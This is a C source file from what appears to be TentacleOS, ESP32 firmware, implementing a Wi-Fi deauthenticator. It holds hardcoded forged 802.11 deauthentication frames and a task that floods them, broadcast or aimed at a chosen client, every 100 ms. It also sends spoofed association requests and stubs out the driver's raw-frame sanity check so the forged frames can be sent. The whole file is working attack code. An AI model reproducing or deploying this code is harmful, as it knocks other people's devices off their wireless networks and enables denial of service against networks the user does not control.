// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "wifi_deauther.h"

#include <string.h>

#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "sys_prio.h"

#include "led_control.h"

static const char *TAG = "WIFI_DEAUTHER";

#define DEAUTHER_STACK_SIZE     4096
#define DEAUTHER_TASK_PRIORITY SYS_PRIO_SERVICE_HI
#define DEAUTHER_DELAY_MS       100
#define DEAUTHER_STOP_MARGIN_MS 50
#define DEAUTH_FRAME_LEN        26
#define BSSID_LEN               6
#define MAC_LEN                 6

static const uint8_t DEAUTH_FRAME_INVALID_AUTH[] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};

static const uint8_t DEAUTH_FRAME_INACTIVITY[] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x04, 0x00};

static const uint8_t DEAUTH_FRAME_CLASS3[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
                                              0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                              0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x07, 0x00};

static TaskHandle_t s_deauth_task_handle = NULL;
static StackType_t *s_deauth_task_stack = NULL;
static StaticTask_t *s_deauth_task_tcb = NULL;
static bool s_is_running = false;

static wifi_ap_record_t s_target_ap;
static wifi_deauther_frame_type_t s_type;
static bool s_is_broadcast;
static bool s_has_client = false;
static uint8_t s_target_client[MAC_LEN];

static const uint8_t *get_deauth_frame_template(wifi_deauther_frame_type_t type);
static void deauth_task(void *pvParameters);

void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  if (ret != ESP_OK) {
    ESP_LOGD(TAG, "TX Fail: 0x%x", ret);
    led_blink_red();
  } else {
    led_blink_green();
  }
}

void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record,
                                     wifi_deauther_frame_type_t type) {
  const uint8_t *frame_template = get_deauth_frame_template(type);
  uint8_t deauth_frame[DEAUTH_FRAME_LEN];
  memcpy(deauth_frame, frame_template, DEAUTH_FRAME_LEN);

  memcpy(&deauth_frame[4], ap_record->bssid, BSSID_LEN);
  memcpy(&deauth_frame[10], ap_record->bssid, BSSID_LEN);
  memcpy(&deauth_frame[16], ap_record->bssid, BSSID_LEN);

  esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
  wifi_deauther_send_raw_frame(deauth_frame, DEAUTH_FRAME_LEN);
}

void wifi_deauther_send_broadcast_deauth(const wifi_ap_record_t *ap_record,
                                         wifi_deauther_frame_type_t type) {
  const uint8_t *frame_template = get_deauth_frame_template(type);
  uint8_t deauth_frame[DEAUTH_FRAME_LEN];
  memcpy(deauth_frame, frame_template, DEAUTH_FRAME_LEN);

  memset(&deauth_frame[4], 0xFF, BSSID_LEN);
  memcpy(&deauth_frame[10], ap_record->bssid, BSSID_LEN);
  memcpy(&deauth_frame[16], ap_record->bssid, BSSID_LEN);

  esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
  wifi_deauther_send_raw_frame(deauth_frame, DEAUTH_FRAME_LEN);
}

void wifi_deauther_send_association_request(const wifi_ap_record_t *ap_record) {
  if (ap_record == NULL)
    return;

  esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);

  uint8_t packet[128];
  memset(packet, 0, sizeof(packet));
  int idx = 0;

  packet[idx++] = 0x00;
  packet[idx++] = 0x00;
  packet[idx++] = 0x3a;
  packet[idx++] = 0x01;
  memcpy(&packet[idx], ap_record->bssid, BSSID_LEN);
  idx += BSSID_LEN;
  uint8_t my_mac[MAC_LEN];
  esp_wifi_get_mac(WIFI_IF_STA, my_mac);
  memcpy(&packet[idx], my_mac, MAC_LEN);
  idx += MAC_LEN;
  memcpy(&packet[idx], ap_record->bssid, BSSID_LEN);
  idx += BSSID_LEN;
  packet[idx++] = 0x00;
  packet[idx++] = 0x00;

  packet[idx++] = 0x31;
  packet[idx++] = 0x04;
  packet[idx++] = 0x0A;
  packet[idx++] = 0x00;

  packet[idx++] = 0x00;
  uint8_t ssid_len = strlen((char *)ap_record->ssid);
  packet[idx++] = ssid_len;
  memcpy(&packet[idx], ap_record->ssid, ssid_len);
  idx += ssid_len;

  uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  packet[idx++] = 0x01;
  packet[idx++] = sizeof(rates);
  memcpy(&packet[idx], rates, sizeof(rates));
  idx += sizeof(rates);

  uint8_t ext_rates[] = {0x0c, 0x12, 0x18, 0x60};
  packet[idx++] = 50;
  packet[idx++] = sizeof(ext_rates);
  memcpy(&packet[idx], ext_rates, sizeof(ext_rates));
  idx += sizeof(ext_rates);

  wifi_deauther_send_raw_frame(packet, idx);
}

bool wifi_deauther_start(const wifi_ap_record_t *ap_record,
                         wifi_deauther_frame_type_t type,
                         bool is_broadcast) {
  if (s_is_running)
    return false;
  if (ap_record == NULL)
    return false;

  // Clean up previous task memory if it wasn't freed
  if (s_deauth_task_stack != NULL) {
    free(s_deauth_task_stack);
    s_deauth_task_stack = NULL;
  }
  if (s_deauth_task_tcb != NULL) {
    free(s_deauth_task_tcb);
    s_deauth_task_tcb = NULL;
  }

  memcpy(&s_target_ap, ap_record, sizeof(wifi_ap_record_t));
  s_type = type;
  s_is_broadcast = is_broadcast;
  s_has_client = false;
  s_is_running = true;

  s_deauth_task_stack =
      (StackType_t *)heap_caps_malloc(DEAUTHER_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  s_deauth_task_tcb =
      (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);

  if (s_deauth_task_stack == NULL || s_deauth_task_tcb == NULL) {
    ESP_LOGE(TAG, "Failed to alloc Deauther Task PSRAM");
    if (s_deauth_task_stack != NULL) {
      free(s_deauth_task_stack);
      s_deauth_task_stack = NULL;
    }
    if (s_deauth_task_tcb != NULL) {
      free(s_deauth_task_tcb);
      s_deauth_task_tcb = NULL;
    }
    s_is_running = false;
    return false;
  }

  s_deauth_task_handle = xTaskCreateStatic(deauth_task,
                                           "deauth_task",
                                           DEAUTHER_STACK_SIZE,
                                           NULL,
                                           DEAUTHER_TASK_PRIORITY,
                                           s_deauth_task_stack,
                                           s_deauth_task_tcb);

  return (s_deauth_task_handle != NULL);
}

bool wifi_deauther_start_targeted(const wifi_ap_record_t *ap_record,
                                  const uint8_t client_mac[6],
                                  wifi_deauther_frame_type_t type) {
  if (s_is_running)
    return false;
  if (ap_record == NULL || client_mac == NULL)
    return false;

  if (s_deauth_task_stack != NULL) {
    free(s_deauth_task_stack);
    s_deauth_task_stack = NULL;
  }
  if (s_deauth_task_tcb != NULL) {
    free(s_deauth_task_tcb);
    s_deauth_task_tcb = NULL;
  }

  memcpy(&s_target_ap, ap_record, sizeof(wifi_ap_record_t));
  memcpy(s_target_client, client_mac, sizeof(s_target_client));
  s_type = type;
  s_is_broadcast = false;
  s_has_client = true;
  s_is_running = true;

  s_deauth_task_stack =
      (StackType_t *)heap_caps_malloc(DEAUTHER_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  s_deauth_task_tcb =
      (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);

  if (s_deauth_task_stack == NULL || s_deauth_task_tcb == NULL) {
    ESP_LOGE(TAG, "Failed to alloc Deauther Task PSRAM");
    if (s_deauth_task_stack != NULL) {
      free(s_deauth_task_stack);
      s_deauth_task_stack = NULL;
    }
    if (s_deauth_task_tcb != NULL) {
      free(s_deauth_task_tcb);
      s_deauth_task_tcb = NULL;
    }
    s_is_running = false;
    return false;
  }

  s_deauth_task_handle = xTaskCreateStatic(deauth_task,
                                           "deauth_task",
                                           DEAUTHER_STACK_SIZE,
                                           NULL,
                                           DEAUTHER_TASK_PRIORITY,
                                           s_deauth_task_stack,
                                           s_deauth_task_tcb);

  return (s_deauth_task_handle != NULL);
}

void wifi_deauther_stop(void) {
  if (s_is_running) {
    s_is_running = false;
    // Give task time to finish loop and delete itself
    vTaskDelay(pdMS_TO_TICKS(DEAUTHER_DELAY_MS + DEAUTHER_STOP_MARGIN_MS));
  }
}

bool wifi_deauther_is_running(void) {
  return s_is_running;
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

static const uint8_t *get_deauth_frame_template(wifi_deauther_frame_type_t type) {
  switch (type) {
    case WIFI_DEAUTHER_TYPE_INVALID_AUTH:
      return DEAUTH_FRAME_INVALID_AUTH;
    case WIFI_DEAUTHER_TYPE_INACTIVITY:
      return DEAUTH_FRAME_INACTIVITY;
    case WIFI_DEAUTHER_TYPE_CLASS3:
      return DEAUTH_FRAME_CLASS3;
    default:
      return DEAUTH_FRAME_INVALID_AUTH;
  }
}

static void deauth_task(void *pvParameters) {
  ESP_LOGI(TAG, "Deauther Task Started");

  const uint8_t *frame_template = get_deauth_frame_template(s_type);
  uint8_t frame[DEAUTH_FRAME_LEN];
  memcpy(frame, frame_template, DEAUTH_FRAME_LEN);

  if (s_is_broadcast) {
    memset(&frame[4], 0xFF, BSSID_LEN);
  } else {
    if (s_has_client) {
      memcpy(&frame[4], s_target_client, MAC_LEN);
    } else {
      memcpy(&frame[4], s_target_ap.bssid, BSSID_LEN);
    }
  }
  memcpy(&frame[10], s_target_ap.bssid, BSSID_LEN);
  memcpy(&frame[16], s_target_ap.bssid, BSSID_LEN);

  esp_wifi_set_channel(s_target_ap.primary, WIFI_SECOND_CHAN_NONE);

  while (s_is_running) {
    wifi_second_chan_t second;
    uint8_t current_channel;
    esp_wifi_get_channel(&current_channel, &second);
    if (current_channel != s_target_ap.primary) {
      esp_wifi_set_channel(s_target_ap.primary, WIFI_SECOND_CHAN_NONE);
    }

    wifi_deauther_send_raw_frame(frame, DEAUTH_FRAME_LEN);
    vTaskDelay(pdMS_TO_TICKS(DEAUTHER_DELAY_MS));
  }

  s_deauth_task_handle = NULL;
  ESP_LOGI(TAG, "Deauther Task Ended");
  vTaskDelete(NULL);
}
